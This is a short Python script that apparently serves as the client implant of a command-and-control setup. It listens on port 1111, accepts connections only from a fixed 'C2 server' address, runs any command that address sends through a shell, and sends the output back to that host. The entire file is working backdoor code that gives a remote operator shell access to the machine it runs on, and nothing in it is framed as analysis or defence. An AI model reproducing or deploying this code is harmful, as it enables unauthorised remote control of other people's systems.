#!/usr/bin/env python
# coding: utf-8

import socket
import os
import subprocess

s_re = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s_re.bind(('', 1111))
# Socket for receiving command from the C2 server

while True:
        s_re.listen(5)
        client, address = s_re.accept()

        if str(address[0]) == "192.168.0.20":
            print("[+] Connected with the server")
        else:
            print("[WARNING] A wrong server is trying to talk with us, abording mission NOW !!!")
            exit(0)
        # Check if the command are coming from the right C2 server

        response = client.recv(2048)
        if "shell" in str(response).replace("b'","")[:-1] :
                print("[+] Server request a shell")

                cmd = str(response[6:]).replace("b'","")[:-1]
                print("[+] Remote command is : " + cmd)

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(("192.168.0.20", 1111))
                # Socket for sending result of server query

                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout_value = proc.stdout.read() + proc.stderr.read()
                args = stdout_value

                s.send(str('CMD:').encode() + args)

                print("[+] result : " + str(args))
                s.close()
        else:
                print("[-] Server request something that i can't handle now. Update me !")
